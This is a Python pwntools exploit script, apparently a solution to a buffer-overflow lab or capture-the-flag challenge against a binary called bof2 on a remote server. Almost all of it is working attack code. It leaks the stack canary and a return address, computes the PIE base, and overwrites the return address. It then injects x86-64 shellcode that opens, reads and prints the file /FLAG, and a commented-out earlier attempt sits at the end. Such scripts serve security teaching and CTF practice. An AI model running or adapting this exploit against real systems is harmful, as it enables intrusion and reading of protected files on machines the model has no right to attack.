#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.arch = 'amd64'
context.os = 'linux'
port = 12343

exe = './bof2'
elf = ELF(exe)
off_main = elf.symbols[b'main']
print(off_main)

r = remote('up.zoolab.org', port)

code = """
.intel_syntax noprefix
jmp short str_addr
back:
pop rdi
mov rax, 2
mov rsi, 0
syscall
mov rdi, rax
mov rax, 0
mov rsi, rsp
sub rsi, 64
mov rdx, 64
syscall
mov rdx, rax
mov rax, 1
mov rdi, 1
mov rsi, rsp
sub rsi, 64
syscall
mov rax, 60
mov rdi, 0
syscall
str_addr:
call back
.asciz "/FLAG"
"""

# buffer overflow to get the return address
leak_message = b'A' * (144 - 8 + 1) # try to read a full 8 bytes that contains canary
r.recvuntil(b"What's your name? ")
r.send(leak_message)
r.recvuntil(leak_message)
canary_value = r.recvuntil(b'\n').rstrip(b'\n')
tmp = int.from_bytes(canary_value[:7], byteorder='little')
print(f'canary valus is {hex(tmp)}')

canary_value = b"\x00" + canary_value[:7]

leak_message = b'A' * (96 + 8)
r.recvuntil(b"What's the room number? ")
r.send(leak_message)
r.recvuntil(leak_message)
ret_addr = r.recvuntil(b'\n').rstrip(b'\n')
ret_addr = int.from_bytes(ret_addr, byteorder='little')

# according to objdump -d bof2 | grep task, we can get the return offset is 9cb7 + 5 bytes = 9cbc

base_address = ret_addr - 0x9cbc
print(f'base address is {hex(base_address)}')
target_addr = base_address + 0xef220
print(f'target address is {hex(target_addr)}')
target_addr_bytes = target_addr.to_bytes(8, byteorder='little')

leak_message = b"A" * 40 + canary_value + b"B" * 8 + target_addr_bytes  # B*8 is saved rbp
r.recvuntil(b"What's the customer's name? ")
r.send(leak_message)

r.recvuntil(b"Leave your message: ")
# payloads = code.encode()
payloads = asm(code)
r.send(payloads)
r.recvuntil(b"Thank you!\n")

print(r.recvall().decode())


r.interactive()

# 
# 
# ret_offset = 0x9c99 # 0x9bd3 + 0xc6
# pie_base = ret_addr - ret_offset
# msg_addr = pie_base + 0xef220
# msg_addr_bytes = msg_addr.to_bytes(8, byteorder='little')
# 
# 
# leak_message = b'A' *(0x60 + 0x8) + msg_addr_bytes
# r.recvuntil(b"What's the room number? ")
# r.send(leak_message)
# 
# 
# leak_message = b'What the fuck is lab6?'
# r.recvuntil(b"What's the customer's name? ")
# r.send(leak_message)
# 
# 
# r.recvuntil(b"Leave your message: ")
# payloads = code.encode()
# r.send(payloads)
# r.recvuntil(b"Thank you!\n")

